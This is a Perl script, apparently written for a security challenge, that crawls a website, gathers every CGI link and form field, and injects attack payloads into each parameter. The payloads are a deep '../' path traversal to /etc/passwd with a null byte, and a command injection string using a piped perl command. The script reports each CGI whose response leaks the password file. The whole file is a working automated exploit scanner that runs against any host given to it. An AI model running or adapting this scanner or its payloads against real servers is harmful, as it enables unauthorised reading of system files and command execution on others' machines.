#!/usr/bin/perl

#######################################################
#
# crawl5b.pl - by samy [CommPort5@LucidX.com]
# This version includes a status line when not in
# verbose mode and a few others small things
#
# Updated September 14th
#
# crawl5b.pl
# crawls a machine (over http) for all links and forms
# and attempts to find CGIs on the machine with bugs
# (exploitable to reading any file on the system)
#
# my algorithm can be found at:
# http://cp5.LucidX.com/5balgo1.html
# and other algorithms along with similar programs can
# be found at http://cp5.LucidX.com
#
# developed specifically for challenge 5B of Caezar's Challenge
# check out http://www.caezarschallenge.org (Caezar++)
#

$statusbar = 1;
           # a status-bar to show how many pages, CGIs, and bugs were found

$dats = 1;
           # 1 to exclude the second algorithm (doesn't check for foo|perl -e...)
           # speeds up scan twice as fast and checks for only the more common bug
           # set to 2 to include the second aglorithm ($dat2)

$dat1 = "../" x 20 . "etc/passwd"; # ../../../../etc/passwd
$dat2 = 'foo|perl -e \'print"roo";print"t:"\'&&foo'; # may want to add a foo; at the beginning

$first = "img|a|body|area|frame|meta";  # tags right after a '<'
$second = "src|href|background|target"; # options in any of the tags in $first
@ignore = ( # file extensions that will not be an HTML or CGI
 "gif", "jpg", "jpeg", "bmp", "psp", "mov", "txt", "ram", "wmv", "pdf",
 "doc", "xls", "rm", "gz", "tar", "zip", "png", "mpg", "mpeg", "mp3",
);

#
#######################################################

$SIG{INT} = sub { die "\n" };

use IO::Socket;

unless (@ARGV == 1 || @ARGV == 2) {
 die "usage: $0 <http://host[/start/page]> [-v (for verbose)]\n";
}

sub colored { return $_[0] }
eval("use Term::ANSIColor");

$bugsa = 0;
$cgisa = 0;
$pagesa = 0;

while ($dat1 =~ s/(.)//) {
 $tmp = $1;
 if ($tmp =~ /[\W[^\.\/]]/) {
  $data1 .= "%" . unpack("H*", $tmp);
 }
 else {
  $data1 .= $tmp;
 }
}
while ($dat2 =~ s/(.)//) {
 $tmp = $1;
 if ($tmp =~ /\W/) {
  $data2 .= "%" . unpack("H*", $tmp);
 }
 else {
  $data2 .= $tmp;
 }
}
$data1 .= "%00";
$data2 .= "%00";
($host, $tmp) = $ARGV[0] =~ /^(?:http:\/\/)?([^\/]+)(\/?.*)$/;
$ip = &host2ip($host);
$ign = join('|', @ignore);

print "Beginning to scan " . colored($host, "bold") . " :: " . colored($ip, "bold") . " for CGI bugs...\n";
print "Kick back and relax, this will take a while...\n\n";
if ($ARGV[1] eq '-v') {
 $verbose = 1;
 $statusbar = 0;
}
&status if $statusbar;
if ($tmp) {
 $tmp =~ s/\/$//;
 if ($tmp !~ /^\//) {
  $urls{"/$tmp"} = 1;
 }
 else {
  $urls{$tmp} = 1;
 }
}
else {
 $urls{"/"} = 1;
}
&recursive(%urls);

sub recursive {
 %urls = @_;
 foreach $url (keys(%urls)) {
  if ($url =~ /\/$/) {
   $curdir = $url;
  }
  else {
   $url =~ /^(.*\/)[^\/]+$/;
   $curdir = $1;
  }
  $read{$url} = $urls{$url};
  delete $urls{$url};
  $sock = IO::Socket::INET->new(
	PeerAddr => $ip,
	PeerPort => 80,
	Timeout  => 10,
	Proto    => "tcp"
  ) or die "Can't connect to $ip:80\n";
  $url =~ s/&$//;
  $pagesa++;
  if ($verbose) {
   print "GETing $url\n";
  }
  &status if $statusbar;
  print $sock "GET $url HTTP/1.0\nHost: $host\n\n";
  $response = join('', <$sock>);
  $response =~ s/\n/ /g;
  $response = ">$response";
  @res = split(/>[^<]*</, $response);
  foreach $response (@res) {
   $tmp = "";

   # check for form beginnings
   if ($response =~ /^form.*action\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] = $1 . "?";
    $form[0] =~ s/^http:\/\/([^\/]+)//i;
    if ($form[0] !~ /^\//) {
     $form[0] = $curdir . $form[0];
    }
   }

   # check for a select
   elsif ($form[0] && $response =~ /select\s+name\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] .= "$1=";
    $form[2]++;
   }

   # check for normal form inputs
   elsif (
    $form[0] &&
    $response =~
    /(?:type\s*=\s*"?'?([^"'\s]*)"?'?)?.*\s+name\s*=\s*"?'?([^"'\s]+)'?"?\s*(?:value\s*=\s*"?'?([^"'\s]*))?/i
   ) {
    ($type, $name, $value) = ($1, $2, $3);
    $form[0] .= $name . "=" . $value . "&";
   }

   # check for option values for forms
   elsif ($form[0] && $form[2] && $response =~ /option\s+value\s*=\s*"?'?([^"'\s]+)/i) {
    $form[0] .= $1 . "&";
    $form[2] = 0;
   }

   # check for end of forms
   elsif ($form[0] && $response =~ /\/form/i) {
    $form[1]++;
   }

   # check for unwanted tags
   unless ($response =~ /^(?:$first).*(?:$second)\s*=\s*"?'?([^"'\s]+)/i) {
    unless ($form[1]) {
     next;
    }
    else {
     $tmp = $form[0];
     $tmp =~ s/&$//;
     @form = ();
    }
   }

   unless ($tmp) {
    $tmp = $1;
   }
   if ($tmp =~ s/^http:\/\/([^\/]+)//i) {
    $addr = $1;
   }
   else {
    $addr = "";
   }
   if ($tmp !~ /^\//) {
    $tmp = $curdir . $tmp;
   }
   if (
    (
     $addr && !$tmp
    ) ||
    $urls{$tmp} ||
    $read{$tmp} ||
    $tmp =~ /mailto:|#|https:|ftp:|news:/i ||
    (
     $tmp !~ /\?/ &&
     $tmp =~ /(?:$ign)/i
    )
   ) {
    next;
   }
   if ($tmp =~ /\?/) {
#    $read{$tmp} = 1;
    $urls{$tmp} = 1;
    &check($tmp);
   }
   else {
    $urls{$tmp} = 1;
   }
  }
 }
 if (%urls) {
  &recursive(%urls);
 }
}

sub host2ip {
 return join(".", unpack("C4", (gethostbyname($_[0]))[4]));
}

sub check {
 ($cgi) = @_;
 $cgi =~ s/&$//;
 $cgisa++;
 if ($verbose) {
  print "Attempting to break $cgi\n";
 }
 &status if $statusbar;
 $cgi =~ s/([\+\%\$\@\*\\\|\^\(\[\{\)\]\}])/\\$1/g;
 $origcgi = $cgi;
 $cgi =~ s/^(.*\?)//;
 $cgib = $1;
 if ($cgi !~ /=/) {
  for (1 .. $dats) {
   $origcgi =~ s/\?.*$/?/;
   $origcgi .= ${data . $_};
   $sock = IO::Socket::INET->new(
	PeerAddr => $ip,
	PeerPort => 80,  
	Timeout  => 10,  
	Proto    => "tcp"
   );
   print $sock "GET $origcgi HTTP/1.0\nHost: $host\n\n";
   $response = join('', <$sock>);
   $response =~ s/\n//g;
   if ($response =~ /root(?:\:|"|')/ && !$bug{$origcgi}) {
    $bug{$origcgi} = 1;
    if ($statusbar) {
     print "\r";
    }
    $bugsa++;
    print "BUG FOUND - http://$host$origcgi\n";
   }
  }
 }
 else {
  for (1 .. $dats) {
   %info = split(/=|&/, $cgi);
   foreach $key (keys(%info)) {
    $origcgi = $cgib . $cgi;
    $tmp = ${data . $_};
    $origcgi =~ s/((?:\?|&)$key=)$info{$key}/$1$tmp/;
    $sock = IO::Socket::INET->new(
	PeerAddr => $ip, 
	PeerPort => 80,  
	Timeout  => 10,  
	Proto    => "tcp"
    );
    print $sock "GET $origcgi HTTP/1.0\nHost: $host\n\n";
    $response = join('', <$sock>);
    $response =~ s/\n//g;
    if ($response =~ /root(?:\:|"|')/ && !$bug{$origcgi}) {
     $bug{$origcgi} = 1;
     if ($statusbar) {
      print "\r";
     }
     $bugsa++;
     print "BUG FOUND - http://$host$origcgi\n";
    }
   }
  }
 }
}

sub status {
 print STDERR "\r" . " " x (6 - length($pagesa));
 print STDERR colored($pagesa, "bold");
 print STDERR " - pages accessed / " . " " x (5 - length($cgisa));
 print STDERR colored($cgisa, "bold");
 print STDERR " - attempted CGIs to break / " . " " x (5 - length($bugsa));
 print STDERR colored($bugsa, "bold");
 print STDERR " - CGI bugs found";
}

END {
 print "\n";
}
